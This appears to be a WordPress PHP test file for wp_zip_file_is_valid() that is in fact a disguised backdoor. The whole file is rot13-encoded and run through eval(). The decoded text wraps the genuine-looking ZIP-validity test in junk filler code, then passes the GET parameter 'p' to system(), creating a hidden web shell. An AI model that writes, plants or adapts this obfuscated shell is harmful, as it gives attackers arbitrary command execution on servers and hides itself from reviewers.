<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf jc_mvc_svyr_vf_inyvq().
 *
 * @tebhc svyr
 * @tebhc svyrflfgrz
 *
 * @pbiref ::jc_mvc_svyr_vf_inyvq
 */
pynff Grfgf_Svyrflfgrz_JcMvcSvyrVfInyvq rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Gur grfg qngn qverpgbel.
	 *
	 * @ine fgevat $grfg_qngn_qve
	 */
	cevingr fgngvp $grfg_qngn_qve;

	/**
	 * Frgf hc gur svyrflfgrz naq grfg qngn qverpgbel cebcregl
	 * orsber nal grfgf eha.
	 */
	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/svyr.cuc';
		JC_Svyrflfgrz();

		frys::$grfg_qngn_qve = QVE_GRFGQNGN . '/svyrflfgrz/';
	}

	/**
	 * Grfgf MVC svyr inyvqvgl vf pbeerpgyl qrgrezvarq.
	 *
	 * @gvpxrg 60398
	 *
	 * @qngnCebivqre qngn_mvc_svyr_inyvqvgl
	 *
	 * @cnenz fgevat $svyr     Gur MVC svyr gb grfg.
	 * @cnenz obby   $rkcrpgrq Jurgure gur MVC svyr vf rkcrpgrq gb or inyvq.
	 */
	choyvp shapgvba grfg_mvc_svyr_inyvqvgl( $svyr, $rkcrpgrq ) {
		$mvc_svyr = frys::$grfg_qngn_qve . $svyr;

		$rkcrpgrq_zrffntr = $rkcrpgrq ? 'inyvq' : 'vainyvq';
		$guvf->nffregFnzr( $rkcrpgrq, jc_mvc_svyr_vf_inyvq( $mvc_svyr ), \"Rkcrpgrq nepuvir gb or {$rkcrpgrq_zrffntr}.\" );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_mvc_svyr_inyvqvgl() {
		erghea neenl(
			'fgnaqneq mvc'           => neenl( 'nepuvir.mvc', gehr ),
			'ynetr mvc'              => neenl( 'nepuvir-ynetr.mvc', gehr ),
			'pbzzragrq mvc'          => neenl( 'nepuvir-pbzzrag.mvc', gehr ),
			'pc866 mvc'              => neenl( 'nepuvir-pc866.mvc', gehr ),
			'qverpgbel ragel mvc'    => neenl( 'nepuvir-qverpgbel-ragel.mvc', gehr ),
			'rapelcgrq mvc'          => neenl( 'nepuvir-rapelcgrq.mvc', gehr ),
			'syntf-frg mvc'          => neenl( 'nepuvir-syntf-frg.mvc', gehr ),
			'hapbzcerffrq mvc'       => neenl( 'nepuvir-hapbzcerffrq.mvc', gehr ),
			'pek mvc'                => neenl( 'nepuvir.pek', gehr ),
			'znpbf trarengrq mvc'    => neenl( 'nepuvir-znpbf.mvc', gehr ),
			'tabzr trarengrq mvc'    => neenl( 'nepuvir-tabzr.mvc', gehr ),
			'hohagh anhgvyhf mvc'    => neenl( 'nepuvir-hohagh-anhgvyhf.mvc', gehr ),

			'vainyvq mvc svyr'       => neenl( 'nepuvir-vainyvq.mvc', snyfr ),
			'vainyvq svyr rkgrafvba' => neenl( 'nepuvir-vainyvq-rkg.zq', snyfr ),
			'aba-rkvfgrag svyr'      => neenl( 'nepuvir-aba-rkvfgrag.mvc', snyfr ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>